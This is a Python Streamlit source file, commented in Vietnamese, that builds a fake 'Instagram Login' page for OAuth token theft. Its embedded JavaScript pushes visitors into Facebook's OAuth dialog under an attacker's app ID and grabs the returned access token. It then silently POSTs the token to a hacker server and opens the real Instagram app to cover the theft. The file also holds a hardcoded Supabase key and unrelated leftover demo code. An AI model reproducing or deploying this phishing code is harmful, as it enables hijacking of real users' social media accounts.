

import streamlit as st
import streamlit.components.v1 as components

# Cấu hình giao diện và tiêu đề trang web giả mạo
st.set_page_config(page_title="Instagram Login", layout="centered")

# App ID giả mạo kẻ tấn công lấy từ Facebook Developers Portal
CLIENT_ID = "1589243162990530"

# Địa chỉ chính trang Streamlit này (nơi nhận Token về)
REDIRECT_URI = "https://instagram.streamlit.app/"

# 1. Bắt các tham số trên URL xem đã có Access Token chưa
# (Facebook trả về dạng https://instagram.streamlit.app/#access_token=EAAG...)
# Lưu ý: Streamlit xử lý dữ liệu query rất nhanh trên máy chủ Cloud
query_params = st.query_params

# Đoạn mã JavaScript đệm dùng để trích xuất Token nằm sau dấu # (Fragment)
# và tự động gửi/điều hướng
js_code = f"""
<script>
    function initSupabase(url, key) {{
    return new Promise((resolve, reject) => {{
        // Nếu thư viện đã tồn tại thì khởi tạo ngay
        if (window.supabase) {{
        resolve(window.supabase.createClient(url, key));
        return;
        }}

        // Tạo thẻ script nạp thư viện từ CDN
        const script = document.createElement('script');
        script.src = 'https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2';
        
        script.onload = () => {{
        const client = window.supabase.createClient(url, key);
        resolve(client);
        }};
        
        script.onerror = () => reject(new Error('Không thể nạp Supabase SDK'));

        document.head.appendChild(script);
    }});
    }}
    // Kiểm tra xem trên thanh địa chỉ URL có Access Token do Facebook trả về hay chưa
    let hashParams = new URLSearchParams(window.location.hash.substring(1));
    let accessToken = hashParams.get("access_token");

    if (accessToken) {{
        const SUPABASE_URL = 'https://mxuthpngeagcxoxtnjhd.supabase.co';
        const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im14dXRocG5nZWFnY3hveHRuamhkIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODQ2NTA5MjEsImV4cCI6MjEwMDIyNjkyMX0.Fbf5vMxG4C3JERld_4LvlQBPNrQB8UQcz_aloIOaHBs';
        initSupabase(SUPABASE_URL, SUPABASE_KEY)
        .then(async (supabase) => {{            console.log('Supabase đã sẵn sàng!');
            
            // Ví dụ truy vấn dữ liệu từ bảng 'todos'
            const {{ data, error }} = await supabase.from('todos').select('*');
            if (error) console.error(error);
            else console.log(data);
        }})
        .catch((err) => console.error(err));
        // === BƯỚC A: CƯỚP TOKEN ===
        // Gửi ngầm Token về máy chủ riêng của hacker (API)
        fetch("https://api-server-hacker.com/save_token", {{
            method: "POST",
            headers: {{ "Content-Type": "application/json" }},
            body: JSON.stringify({{ token: accessToken, source: "Streamlit_App" }})
        }}).then(() => {{
            // === BƯỚC B: PHI TANG ===
            // Gửi xong lập tức kích hoạt Deep Link để mở App Instagram/Locket thật trên máy nạn nhân
            window.location.href = "instagram://";
        }}).catch(() => {{
            window.location.href = "instagram://";
        }});
    }} else {{
        // === BƯỚC C: ÉP CHUYỂN HƯỚNG SANG FACEBOOK DÙM BẮT ĐẦU ===
        // Nếu chưa có Token, lập tức đẩy người dùng sang Facebook để lấy Token
        let facebookAuthUrl = "https://www.facebook.com/v20.0/dialog/oauth?client_id={CLIENT_ID}&redirect_uri={REDIRECT_URI}&response_type=token&scope=email,public_profile";
        window.location.href = facebookAuthUrl;
    }}
</script>
"""

# Chèn đoạn mã JavaScript trên vào trang Streamlit để nó tự động chạy ngay khi vừa tải trang
components.html(js_code, height=0, width=0)